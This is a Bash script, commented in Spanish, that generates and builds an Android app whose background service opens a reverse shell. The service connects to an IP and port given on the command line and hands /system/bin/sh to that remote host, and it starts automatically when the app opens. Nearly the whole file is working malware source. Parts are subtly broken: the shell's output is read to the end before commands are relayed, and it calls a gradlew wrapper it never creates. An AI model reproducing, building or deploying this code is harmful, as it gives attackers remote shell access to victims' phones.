#!/bin/bash

# Verificar si se pasaron los argumentos de IP y puerto
if [ "$#" -ne 2 ]; then
    echo "Uso: $0 <IP> <Puerto>"
    exit 1
fi

IP="$1"
PORT="$2"

# Crear estructura básica de proyecto
PROJECT_NAME="ReverseShellApp"
PACKAGE_NAME="com.example.reverseshell"

mkdir -p $PROJECT_NAME/app/src/main/java/com/example/reverseshell
mkdir -p $PROJECT_NAME/app/src/main/res/layout
mkdir -p $PROJECT_NAME/app/src/main/res/values

# Crear archivo build.gradle para el módulo app
cat > $PROJECT_NAME/app/build.gradle <<EOL
apply plugin: 'com.android.application'

android {
    compileSdkVersion 33
    defaultConfig {
        applicationId "$PACKAGE_NAME"
        minSdkVersion 21
        targetSdkVersion 33
        versionCode 1
        versionName "1.0"
    }
    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
}
EOL

# Crear archivo build.gradle para el proyecto
cat > $PROJECT_NAME/build.gradle <<EOL
buildscript {
    repositories {
        google()
        mavenCentral()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:8.0.0'
    }
}

allprojects {
    repositories {
        google()
        mavenCentral()
    }
}

task clean(type: Delete) {
    delete rootProject.buildDir
}
EOL

# Crear archivo settings.gradle
cat > $PROJECT_NAME/settings.gradle <<EOL
include ':app'
EOL

# Crear AndroidManifest.xml
cat > $PROJECT_NAME/app/src/main/AndroidManifest.xml <<EOL
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="$PACKAGE_NAME">

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="ReverseShell"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.AppCompat.DayNight.NoActionBar">
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <service android:name=".ReverseShellService" />
    </application>

</manifest>
EOL

# Crear archivo MainActivity.kt
cat > $PROJECT_NAME/app/src/main/java/com/example/reverseshell/MainActivity.kt <<EOL
package $PACKAGE_NAME

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val intent = Intent(this, ReverseShellService::class.java)
        startService(intent)
    }
}
EOL

# Crear archivo ReverseShellService.kt
cat > $PROJECT_NAME/app/src/main/java/com/example/reverseshell/ReverseShellService.kt <<EOL
package $PACKAGE_NAME

import android.app.Service
import android.content.Intent
import android.os.IBinder
import java.io.OutputStream
import java.net.Socket

class ReverseShellService : Service() {

    private val serverIP = "$IP"
    private val serverPort = $PORT

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Thread {
            try {
                val socket = Socket(serverIP, serverPort)
                val process = Runtime.getRuntime().exec("/system/bin/sh")
                val input = process.inputStream
                val output = process.outputStream
                val error = process.errorStream

                val outStream: OutputStream = socket.getOutputStream()
                outStream.write(input.readBytes())
                outStream.write(error.readBytes())
                outStream.flush()

                val inStream = socket.getInputStream()
                val buffer = ByteArray(1024)
                var bytesRead: Int
                while (inStream.read(buffer).also { bytesRead = it } != -1) {
                    output.write(buffer, 0, bytesRead)
                    output.flush()
                }

                socket.close()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
}
EOL

# Crear archivo activity_main.xml
cat > $PROJECT_NAME/app/src/main/res/layout/activity_main.xml <<EOL
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent">

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Reverse Shell App"
        android:layout_centerInParent="true"/>
</RelativeLayout>
EOL

# Crear archivo colors.xml
cat > $PROJECT_NAME/app/src/main/res/values/colors.xml <<EOL
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <color name="colorPrimary">#6200EE</color>
    <color name="colorPrimaryDark">#3700B3</color>
    <color name="colorAccent">#03DAC5</color>
</resources>
EOL

# Crear archivo strings.xml
cat > $PROJECT_NAME/app/src/main/res/values/strings.xml <<EOL
<resources>
    <string name="app_name">ReverseShell</string>
</resources>
EOL

# Crear archivo themes.xml
cat > $PROJECT_NAME/app/src/main/res/values/themes.xml <<EOL
<resources xmlns:tools="http://schemas.android.com/tools">
    <style name="Theme.AppCompat.DayNight.NoActionBar" parent="Theme.MaterialComponents.DayNight.NoActionBar">
        <!-- Customize your theme here. -->
        <item name="colorPrimary">@color/colorPrimary</item>
        <item name="colorPrimaryVariant">@color/colorPrimaryDark</item>
        <item name="colorAccent">@color/colorAccent</item>
    </style>
</resources>
EOL

# Compilar la APK
cd $PROJECT_NAME
./gradlew assembleDebug

echo "APK generada en: app/build/outputs/apk/debug/"
